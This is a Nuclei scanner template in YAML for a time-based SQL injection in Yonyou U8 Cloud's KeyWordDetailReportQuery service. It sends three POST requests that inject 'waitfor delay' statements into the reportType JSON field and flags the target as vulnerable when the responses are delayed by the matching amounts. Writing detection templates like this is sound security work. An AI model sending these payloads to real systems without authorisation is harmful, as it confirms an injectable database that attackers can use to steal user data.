id: yongyou-u8-cloud-KeyWordDetailReportQuery-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。
  reference:
    - https://github.com/wangsir01/docs/blob/master/%E7%94%A8%E5%8F%8BU8Cloud-%E5%87%A0%E4%B8%AAsql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90-%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA/%E7%94%A8%E5%8F%8BU8Cloud-%E5%87%A0%E4%B8%AAsql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90-%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA.md
  tags: tags
http:
  - raw:
      - |-
        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 57

        {"reportType":"1';waitfor delay '0:0:3'-- ","keyword":[]}
      - |-
        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 57

        {"reportType":"1';waitfor delay '0:0:6'-- ","keyword":[]}
      - |-
        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 57

        {"reportType":"1';waitfor delay '0:0:9'-- ","keyword":[]}
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"